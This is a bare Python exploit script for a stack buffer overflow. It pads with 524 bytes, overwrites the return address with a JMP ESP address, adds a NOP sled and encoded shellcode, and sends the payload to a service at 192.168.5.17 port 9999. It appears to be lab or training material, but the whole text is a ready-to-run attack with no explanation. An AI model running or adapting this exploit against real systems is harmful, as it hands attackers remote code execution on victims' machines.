import socket
import sys
import time

aChars = 'A' * 524
jmpesp = '\xf3\x12\x17\x31'
nops = '\x90' * 16
buf =  ""
buf += "\xb8\xc0\xda\x07\x84\xdb\xc7\xd9\x74\x24\xf4\x5b\x29"
buf += "\xc9\xb1\x52\x83\xeb\xfc\x31\x43\x0e\x03\x83\xd4\xe5"
buf += "\x71\xff\x01\x6b\x79\xff\xd1\x0c\xf3\x1a\xe0\x0c\x67"
buf += "\x6f\x53\xbd\xe3\x3d\x58\x36\xa1\xd5\xeb\x3a\x6e\xda"
buf += "\x5c\xf0\x48\xd5\x5d\xa9\xa9\x74\xde\xb0\xfd\x56\xdf"
buf += "\x7a\xf0\x97\x18\x66\xf9\xc5\xf1\xec\xac\xf9\x76\xb8"
buf += "\x6c\x72\xc4\x2c\xf5\x67\x9d\x4f\xd4\x36\x95\x09\xf6"
buf += "\xb9\x7a\x22\xbf\xa1\x9f\x0f\x09\x5a\x6b\xfb\x88\x8a"
buf += "\xa5\x04\x26\xf3\x09\xf7\x36\x34\xad\xe8\x4c\x4c\xcd"
buf += "\x95\x56\x8b\xaf\x41\xd2\x0f\x17\x01\x44\xeb\xa9\xc6"
buf += "\x13\x78\xa5\xa3\x50\x26\xaa\x32\xb4\x5d\xd6\xbf\x3b"
buf += "\xb1\x5e\xfb\x1f\x15\x3a\x5f\x01\x0c\xe6\x0e\x3e\x4e"
buf += "\x49\xee\x9a\x05\x64\xfb\x96\x44\xe1\xc8\x9a\x76\xf1"
buf += "\x46\xac\x05\xc3\xc9\x06\x81\x6f\x81\x80\x56\x8f\xb8"
buf += "\x75\xc8\x6e\x43\x86\xc1\xb4\x17\xd6\x79\x1c\x18\xbd"
buf += "\x79\xa1\xcd\x12\x29\x0d\xbe\xd2\x99\xed\x6e\xbb\xf3"
buf += "\xe1\x51\xdb\xfc\x2b\xfa\x76\x07\xbc\xc5\x2f\x02\x38"
buf += "\xae\x2d\x0c\x51\x72\xbb\xea\x3b\x9a\xed\xa5\xd3\x03"
buf += "\xb4\x3d\x45\xcb\x62\x38\x45\x47\x81\xbd\x08\xa0\xec"
buf += "\xad\xfd\x40\xbb\x8f\xa8\x5f\x11\xa7\x37\xcd\xfe\x37"
buf += "\x31\xee\xa8\x60\x16\xc0\xa0\xe4\x8a\x7b\x1b\x1a\x57"
buf += "\x1d\x64\x9e\x8c\xde\x6b\x1f\x40\x5a\x48\x0f\x9c\x63"
buf += "\xd4\x7b\x70\x32\x82\xd5\x36\xec\x64\x8f\xe0\x43\x2f"
buf += "\x47\x74\xa8\xf0\x11\x79\xe5\x86\xfd\xc8\x50\xdf\x02"
buf += "\xe4\x34\xd7\x7b\x18\xa5\x18\x56\x98\xd5\x52\xfa\x89"
buf += "\x7d\x3b\x6f\x88\xe3\xbc\x5a\xcf\x1d\x3f\x6e\xb0\xd9"
buf += "\x5f\x1b\xb5\xa6\xe7\xf0\xc7\xb7\x8d\xf6\x74\xb7\x87"
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.5.17',9999))
    print(s.recv(1024))
    print('Exploiting Buffer Overflow ...')
    s.send(aChars + jmpesp + nops + buf)
    print(s.recv(1024))
    s.close()
except Exception:
    sys.exit()
